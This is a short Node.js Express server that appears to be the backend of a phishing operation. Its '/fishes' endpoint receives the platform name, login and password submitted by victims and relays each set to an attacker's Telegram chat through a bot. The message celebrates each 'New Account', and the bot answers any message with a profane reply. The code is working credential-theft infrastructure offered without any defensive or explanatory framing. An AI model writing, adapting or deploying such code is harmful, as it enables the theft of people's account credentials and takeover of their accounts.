require("dotenv").config()

const express = require("express")
const cors = require("cors")

const TeleBot = require("telebot")
const TOKEN = process.env.TOKEN
const chatId = process.env.CHATID

const bot = new TeleBot(TOKEN)

const app = express()

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({extended: true}))

app.get("/", (req, res) => {
  res.send("Hello World!")
})

app.post("/fishes", (req, res) => {
  const { platform, login, password } = req.body

  const myText = `
  (っ◔◡◔)っ ♥ New Account ♥\n
    📱𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: ${platform}
    👀𝗟𝗼𝗴𝗶𝗻: ${login}
    🔒𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: ${password}
  `

  bot.sendMessage(chatId, myText)

  res.status(200).send("Fine!")
})

bot.on("text", (msg) => msg.reply.text(`Fucking Doing? 🗿`))

bot.start()

const port = process.env.PORT || 8000
app.listen(port, () => {
  console.log("server is running, ", port);
})